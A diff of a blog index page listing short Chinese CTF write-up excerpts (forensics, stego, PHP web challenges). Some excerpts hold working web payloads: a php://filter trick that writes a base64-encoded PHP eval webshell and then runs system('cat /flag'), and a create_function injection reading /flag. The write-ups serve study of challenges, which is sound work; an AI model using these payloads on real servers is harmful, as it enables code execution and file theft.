@@ -181,8 +181,8 @@
         
 
 <div class="post">
-    <a href="/2026/02/27/2026-02-27-%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88/">
-        <h2 class="post-title">你耳机听什么</h2>
+    <a href="/2026/02/27/2026-02-27-%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD/">
+        <h2 class="post-title">旧日絮语</h2>
     </a>
     <div class="category-and-date">
         
@@ -198,26 +198,23 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>第一部分是一个残缺的二维码把它补齐</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_39bf7dbf.png" alt="你耳机听什么_39bf7dbf"></p>
-<p>识别得到<a target="_blank" rel="noopener" href="https://qr61.cn/oLHDAn/qYdgRdp%E6%9F%A5%E7%9C%8B%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81">https://qr61.cn/oLHDAn/qYdgRdp查看发现是一段代码</a></p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_94ecb216.png" alt="你耳机听什么_94ecb216"></p>
-<p>第二部分是一个加密的word文件附带了一串数字猜测是按照ascll码转换成字符</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_70e051e2.png" alt="你耳机听什么_70e051e2"></p>
-<p>得到f1@9i$HerE成功解开加密，打开发现是空的</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_67ef215e.png" alt="你耳机听什么_67ef215e"></p>
-<p>发现后面还有未显示的内容改一下字体颜色得到内容</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_14b7e407.png" alt="你耳机听什么_14b7e407"></p>
-<p>解码得到第二部分内容</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_d152ea83.png" alt="你耳机听什么_d152ea83"></p>
-<p>第三部分查看图片属性备注提示steghide</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_1ccacf19.png" alt="你耳机听什么_1ccacf19"></p>
-<p>用stegseek爆破</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_48fe9442.png" alt="你耳机听什么_48fe9442"></p>
-<p>得到第三部分</p>
-<p><img src="/images/writeups/%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88_4b8fc704.png" alt="你耳机听什么_4b8fc704"></p>
-<p>合并代码运行发现歌曲是晴天根据提示得到flag</p>
-<p>flag{cbbe546304037478ce0c36437d036711}</p>
+            <p>这里怀疑高度被修改过</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_610ee2d4.png" alt="旧日絮语_610ee2d4"></p>
+<p>修改高度得到密码</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_a72be5b4.png" alt="旧日絮语_a72be5b4"></p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_93e5f2bc.png" alt="旧日絮语_93e5f2bc"></p>
+<p>发现包含word文件</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_c5a39c46.png" alt="旧日絮语_c5a39c46"></p>
+<p>Binwalk分离得到word文档</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_8e7ce446.png" alt="旧日絮语_8e7ce446"></p>
+<p>没有信息可能被隐藏了设置选择隐藏文件后得到隐藏文字</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_298057da.png" alt="旧日絮语_298057da"></p>
+<p>用base64转文件得到压缩包里面有加密在word属性中找到密码</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_4ee846d0.png" alt="旧日絮语_4ee846d0"></p>
+<p>得到.exe文件用IDA分析找到key</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_f2734eca.png" alt="旧日絮语_f2734eca"></p>
+<p>根据逻辑写脚本得到flag</p>
+<p><img src="/images/writeups/%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD_cdec268e.png" alt="旧日絮语_cdec268e"></p>
 
             
         </div>
@@ -236,12 +233,12 @@
         </span>
         
     </div>
-    <a href="/2026/02/27/2026-02-27-%E4%BD%A0%E8%80%B3%E6%9C%BA%E5%90%AC%E4%BB%80%E4%B9%88/" class="go-post">阅读全文</a>
+    <a href="/2026/02/27/2026-02-27-%E6%97%A7%E6%97%A5%E7%B5%AE%E8%AF%AD/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2026/02/27/2026-02-27-%E6%9F%90%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%8D%E4%BB%87/">
-        <h2 class="post-title">某函数的复仇</h2>
+    <a href="/2026/02/27/2026-02-27-solid/">
+        <h2 class="post-title">solid</h2>
     </a>
     <div class="category-and-date">
         
@@ -257,11 +254,12 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>题目告诉我们flag在&#x2F;flag里面这里只要读取&#x2F;flag就行了</p>
-<p>这里需要利用$shaw(‘’,$root);执行命令构造payload：?root&#x3D;;}readfile(‘&#x2F;flag’);&#x2F;*</p>
-<p>POST：shaw&#x3D;create_function</p>
+            <p>这道题看图完整的只有这6个中间还有顺序的数字</p>
+<p><img src="/images/writeups/solid_c5d66642.png" alt="solid_c5d66642"></p>
+<p>根据1不动把每个面拼成立体864513解出来就是952375再按照题目加密</p>
+<p><img src="/images/writeups/solid_796a5d88.png" alt="solid_796a5d88"></p>
 <p>得到flag</p>
-<p><img src="/images/writeups/%E6%9F%90%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%8D%E4%BB%87_ca197ef1.png" alt="某函数的复仇_ca197ef1"></p>
+<p>Flag{70af0aa975da81f48080d64b400b03d7}</p>
 
             
         </div>
@@ -280,7 +278,57 @@
         </span>
         
     </div>
-    <a href="/2026/02/27/2026-02-27-%E6%9F%90%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%8D%E4%BB%87/" class="go-post">阅读全文</a>
+    <a href="/2026/02/27/2026-02-27-solid/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/26/2026-02-26-%E5%86%99shell/">
+        <h2 class="post-title">写shell</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这道题”&lt;?php exit();”会影响后续代码的执行这里用base64绕过</p>
+<p>Payload：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>POST：content&#x3D;aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;</p>
+<p>再访问&#x2F;shell.php，POST传1&#x3D;system(‘cat &#x2F;flag’);</p>
+<p>得到flag</p>
+<p><img src="/images/writeups/%E5%86%99shell_d265fe17.png" alt="写shell_d265fe17"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Webshell/" style="color: #ffa2c4">Webshell</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/26/2026-02-26-%E5%86%99shell/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -327,56 +375,6 @@
 </div>
 
 <div class="post">
-    <a href="/2026/02/26/2026-02-26-%E5%86%99shell/">
-        <h2 class="post-title">写shell</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/26
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>这道题”&lt;?php exit();”会影响后续代码的执行这里用base64绕过</p>
-<p>Payload：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
-<p>POST：content&#x3D;aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;</p>
-<p>再访问&#x2F;shell.php，POST传1&#x3D;system(‘cat &#x2F;flag’);</p>
-<p>得到flag</p>
-<p><img src="/images/writeups/%E5%86%99shell_d265fe17.png" alt="写shell_d265fe17"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/Webshell/" style="color: #ffa2c4">Webshell</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/26/2026-02-26-%E5%86%99shell/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
     <a href="/2026/02/26/2026-02-26-%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/">
         <h2 class="post-title">到底给不给flag呢</h2>
     </a>
@@ -417,7 +415,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
     </div>
@@ -465,7 +463,7 @@
         
         <span class="tag">
             
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #ff7d73">SQL注入</a>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #03a9f4">SQL注入</a>
         </span>
         
     </div>
@@ -473,8 +471,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/02/25/2026-02-25-$$/">
-        <h2 class="post-title">$$</h2>
+    <a href="/2026/02/25/2026-02-25-%E7%88%86%E7%A0%B4/">
+        <h2 class="post-title">爆破</h2>
     </a>
     <div class="category-and-date">
         
@@ -490,8 +488,10 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>这里flag估计是个变量直接让c&#x3D;GLOBALS查看所有变量得到flag</p>
-<p><img src="/images/writeups/$$_9356264f.png" alt="$$_9356264f"></p>
+            <p>根据题目构造脚本爆破得到密码</p>
+<p><img src="/images/writeups/%E7%88%86%E7%A0%B4_70d497b2.png" alt="爆破_70d497b2"></p>
+<p>输入密码得到flag</p>
+<p><img src="/images/writeups/%E7%88%86%E7%A0%B4_aafff50a.png" alt="爆破_aafff50a"></p>
 
             
         </div>
@@ -506,11 +506,16 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%88%86%E7%A0%B4/" style="color: #00a596">爆破</a>
         </span>
         
     </div>
-    <a href="/2026/02/25/2026-02-25-$$/" class="go-post">阅读全文</a>
+    <a href="/2026/02/25/2026-02-25-%E7%88%86%E7%A0%B4/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -549,12 +554,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/HTTP%E5%A4%B4/" style="color: #00bcd4">HTTP头</a>
+            <a href="/tags/HTTP%E5%A4%B4/" style="color: #ffa2c4">HTTP头</a>
         </span>
         
     </div>
@@ -601,7 +606,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
     </div>
@@ -609,8 +614,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/02/25/2026-02-25-%E7%88%86%E7%A0%B4/">
-        <h2 class="post-title">爆破</h2>
+    <a href="/2026/02/25/2026-02-25-$$/">
+        <h2 class="post-title">$$</h2>
     </a>
     <div class="category-and-date">
         
@@ -626,10 +631,8 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>根据题目构造脚本爆破得到密码</p>
-<p><img src="/images/writeups/%E7%88%86%E7%A0%B4_70d497b2.png" alt="爆破_70d497b2"></p>
-<p>输入密码得到flag</p>
-<p><img src="/images/writeups/%E7%88%86%E7%A0%B4_aafff50a.png" alt="爆破_aafff50a"></p>
+            <p>这里flag估计是个变量直接让c&#x3D;GLOBALS查看所有变量得到flag</p>
+<p><img src="/images/writeups/$$_9356264f.png" alt="$$_9356264f"></p>
 
             
         </div>
@@ -644,16 +647,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%88%86%E7%A0%B4/" style="color: #00a596">爆破</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
     </div>
-    <a href="/2026/02/25/2026-02-25-%E7%88%86%E7%A0%B4/" class="go-post">阅读全文</a>
+    <a href="/2026/02/25/2026-02-25-$$/" class="go-post">阅读全文</a>
 </div>
 
 
